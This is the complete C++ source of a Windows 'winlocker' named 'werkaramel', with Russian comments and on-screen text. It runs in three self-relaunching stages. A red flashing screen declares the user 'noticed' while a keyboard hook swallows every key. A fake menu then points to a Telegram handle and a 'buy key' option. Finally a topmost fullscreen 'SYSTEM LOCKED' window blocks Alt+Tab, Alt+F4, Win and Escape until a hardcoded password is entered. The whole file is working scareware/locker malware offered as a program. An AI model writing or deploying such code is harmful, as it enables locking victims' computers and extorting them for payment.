// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — 3 modes: red flash / green menu / winlocker
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";

HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HANDLE g_hIn = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
std::wstring g_input;
bool g_done = false;
std::mt19937 g_rng(std::random_device{}());

// ═══════════════════════════════════════════════════════════
// КОНСОЛЬНЫЕ УТИЛИТЫ
// ═══════════════════════════════════════════════════════════
void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen(WORD bg = 0) {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, bg, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT) return TRUE;
    return FALSE;
}

void LockConsole() {
    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
    SetWindowLong(g_hCon, GWL_STYLE, style);
    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
    }
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh, SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 20;
    cfi.dwFontSize.X = 10;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
}

void LaunchSelf(const std::wstring& arg) {
    wchar_t exePath[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring cmd = L"\"" + std::wstring(exePath) + L"\" " + arg;
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
                       nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// блокировка системных клавиш
LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
    }
    return CallNextHookEx(nullptr, code, wp, lp);
}

// полная блокировка (для красной фазы)
LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) return 1;
    return CallNextHookEx(nullptr, code, wp, lp);
}

// ═══════════════════════════════════════════════════════════
// РЕЖИМ 1: КРАСНЫЙ CMD (--red)
// ═══════════════════════════════════════════════════════════
void RunRed() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    LockConsole();
    ShowWindow(g_hCon, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_hCon);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    // мерцание 2 сек
    for (int i = 0; i < 12; ++i) {
        ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
        ClearScreen(0);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }

    // ВАС ЗАМЕТИЛИ 1 сек
    ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring txt = L"В А С   З А М Е Т И Л И";
    Gotoxy((cols - (int)txt.size()) / 2, rows / 2);
    WOut(txt);
    std::this_thread::sleep_for(std::chrono::seconds(1));

    // запускаем --green и выходим
    LaunchSelf(L"--green");
    UnhookWindowsHookEx(g_kbHook);
    ExitProcess(0);
}

// ═══════════════════════════════════════════════════════════
// РЕЖИМ 2: ЗЕЛЁНЫЙ CMD (--green)
// ═══════════════════════════════════════════════════════════
void PrintMenu() {
    ClearScreen(0);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;
    int rows = csbi.dwSize.Y;

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wstring logo = L"W E R K A R A M E L";
    Gotoxy((cols - (int)logo.size()) / 2, 3); WOut(logo);
    std::wstring sub = L"W I N L O C K E R";
    Gotoxy((cols - (int)sub.size()) / 2, 5); WOut(sub);
    std::wstring line(60, L'=');
    Gotoxy((cols - 60) / 2, 7); WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring head = L"Выберите действие:";
    Gotoxy((cols - (int)head.size()) / 2, 9); WOut(head);

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(10, 11); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
    Gotoxy(10, 12); WOut(L"[ 2 ]   Купить ключ");
    Gotoxy(10, 13); WOut(L"[ 3 ]   Выйти");

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::wstring hint = L"введите 1 / 2 / 3 и нажмите Enter";
    Gotoxy((cols - (int)hint.size()) / 2, rows - 4); WOut(hint);

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, rows - 2); WOut(L"> ");
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    WOut(g_input + L"  ");
}

void RunGreen() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    LockConsole();
    ShowWindow(g_hCon, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_hCon);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);

    PrintMenu();

    INPUT_RECORD rec;
    DWORD read = 0;

    while (!g_done) {
        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            continue;
        }
        if (rec.EventType != KEY_EVENT) continue;
        if (!rec.Event.KeyEvent.bKeyDown) continue;

        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
        if (c == 0) continue;

        if (c >= L'0' && c <= L'9') {
            g_input += c;
            PrintMenu();
        } else if (c == L'\b') {
            if (!g_input.empty()) g_input.pop_back();
            PrintMenu();
        } else if (c == L'\r') {
            if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                g_done = true;
                LaunchSelf(L"--locker");
                UnhookWindowsHookEx(g_kbHook);
                ExitProcess(0);
            } else {
                g_input.clear();
                PrintMenu();
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// РЕЖИМ 3: WINLOCKER (--locker)
// ═══════════════════════════════════════════════════════════
const COLORREF C_BG = RGB(0, 0, 0);
const COLORREF C_RED = RGB(220, 30, 30);
const COLORREF C_FG = RGB(255, 255, 255);
const COLORREF C_DIM = RGB(120, 120, 120);
std::wstring g_locker_input;
bool g_locker_wrong = false;
bool g_locker_done = false;

void DrawL(HDC dc, int x, int y, const std::wstring& s, COLORREF c,
           int size, bool bold = false, bool center = false, int winW = 0) {
    HFONT font = CreateFontW(size, 0, 0, 0, bold ? FW_BOLD : FW_NORMAL,
                             FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                             OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, c);
    SetBkMode(dc, TRANSPARENT);
    if (center) {
        SIZE sz;
        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
        x = (winW - sz.cx) / 2;
    }
    TextOutW(dc, x, y, s.c_str(), (int)s.size());
    SelectObject(dc, old);
    DeleteObject(font);
}

void LockerPaint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC dc = BeginPaint(hwnd, &ps);
    RECT rc; GetClientRect(hwnd, &rc);
    HBRUSH bg = CreateSolidBrush(C_BG);
    FillRect(dc, &rc, bg);
    DeleteObject(bg);
    int cx = rc.right / 2;
    DrawL(dc, 0, 60, L"WERKARAMEL", C_RED, 60, true, true, rc.right);
    for (int x = cx - 300; x < cx + 300; x += 14)
        DrawL(dc, x, 150, L"▬", C_RED, 12);
    DrawL(dc, 0, 200, L"SYSTEM LOCKED", C_RED, 110, true, true, rc.right);
    DrawL(dc, 0, 340, L"введите пароль для разблокировки", C_DIM, 24, false, true, rc.right);
    DrawL(dc, 0, 380, L"tg: @werkaramel", C_RED, 26, false, true, rc.right);
    int boxW = 600, boxH = 80;
    int boxX = cx - boxW / 2;
    int boxY = rc.bottom / 2 + 60;
    RECT box{ boxX, boxY, boxX + boxW, boxY + boxH };
    HBRUSH bf = CreateSolidBrush(RGB(20, 20, 20));
    FillRect(dc, &box, bf);
    DeleteObject(bf);
    FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));
    std::wstring masked(g_locker_input.size(), L'*');
    DrawL(dc, boxX + 30, boxY + 22, masked, C_FG, 40);
    if (g_locker_wrong) {
        DrawL(dc, 0, boxY + boxH + 30, L"НЕВЕРНЫЙ ПАРОЛЬ", C_RED, 28, true, true, rc.right);
    } else {
        DrawL(dc, 0, boxY + boxH + 30, L"[ Enter ]  разблокировать", C_DIM, 22, false, true, rc.right);
    }
    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: LockerPaint(hwnd); return 0;
    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (wp == VK_ESCAPE) return 0;
        return 0;
    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
        return 0;
    case WM_CLOSE: return 0;
    case WM_CHAR:
        if (wp == VK_BACK) {
            if (!g_locker_input.empty()) g_locker_input.pop_back();
            g_locker_wrong = false;
        } else if (wp == VK_RETURN) {
            if (g_locker_input == PASS) {
                g_locker_done = true;
                UnhookWindowsHookEx(g_kbHook);
                PostQuitMessage(0);
            } else {
                g_locker_input.clear();
                g_locker_wrong = true;
                MessageBeep(MB_ICONHAND);
            }
        } else if (wp >= 32) {
            g_locker_input.push_back((wchar_t)wp);
            g_locker_wrong = false;
        }
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    case WM_DESTROY:
        UnhookWindowsHookEx(g_kbHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void RunLocker() {
    WNDCLASSW wc{};
    wc.lpfnWndProc = LockerProc;
    wc.hInstance = GetModuleHandleW(nullptr);
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"werka_locker";
    RegisterClassW(&wc);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"werka_locker", L"System Locked",
        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);
    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);
    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
}

// ═══════════════════════════════════════════════════════════
// ТОЧКА ВХОДА
// ═══════════════════════════════════════════════════════════
int wmain(int argc, wchar_t** argv) {
    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"--red") == 0) {
            RunRed();
            return 0;
        }
        if (wcscmp(argv[i], L"--green") == 0) {
            RunGreen();
            return 0;
        }
        if (wcscmp(argv[i], L"--locker") == 0) {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            RunLocker();
            return 0;
        }
    }
    // без флага — стартуем с --red
    LaunchSelf(L"--red");
    return 0;
}
